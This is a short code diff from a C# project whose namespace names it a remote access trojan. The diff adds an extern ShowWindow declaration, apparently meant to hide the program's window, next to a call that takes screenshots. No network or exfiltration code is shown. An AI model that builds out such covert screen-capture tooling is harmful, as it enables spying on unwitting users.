@@ -10,10 +10,14 @@ namespace remote_access_trojan
     {
         static void Main(string[] args)
         {
+
+
             Console.WriteLine("Hello World!");
 
             Screenshot screenshotManager = new Screenshot();
             screenshotManager.takeScreenshot();
         }
+
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
     }
 }
